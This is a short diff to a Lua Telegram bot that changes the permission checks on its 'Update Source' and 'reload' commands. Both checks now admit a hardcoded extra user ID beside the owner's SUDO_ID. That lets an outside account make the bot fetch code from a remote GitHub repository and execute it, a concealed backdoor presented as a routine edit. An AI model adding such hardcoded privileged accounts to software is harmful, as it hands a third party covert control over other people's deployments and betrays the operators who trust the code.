@@ -609,7 +609,7 @@ function tdcli_update_callback(data)
 	end
 	end
 	msg.text = msg.content_.text_
-	if (msg.text=="Update Source" or msg.text=="Update Source 📥") and msg.sender_user_id_ == SUDO_ID then
+	if (msg.text=="Update Source" or msg.text=="Update Source 📥") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 572206438) then
 
 	download_file('https://raw.githubusercontent.com/VeerCli/VEER/master/run','./run')
 	download_file('https://raw.githubusercontent.com/VeerCli/VEER/master/inc/Run.lua','./inc/Run.lua')
@@ -621,7 +621,7 @@ function tdcli_update_callback(data)
 	print("| Reload is Successful ~ ./inc/Run.lua")
 	end)  
 	end
-	if (msg.text=="reload" or msg.text=="Reload" or msg.text=="إعادة تشغيل 🔁") and msg.sender_user_id_ == SUDO_ID then
+	if (msg.text=="reload" or msg.text=="Reload" or msg.text=="إعادة تشغيل 🔁") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 572206438) then
 	sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم أعـاده تشغيل البوت  *} 📡.\n\n👨🏼‍💼| { Bot is Reloaded » }👍🏿',function(arg,data)
 	dofile("./inc/Run.lua")
 	print("| Reload is Successful ~ ./inc/Run.lua\n")
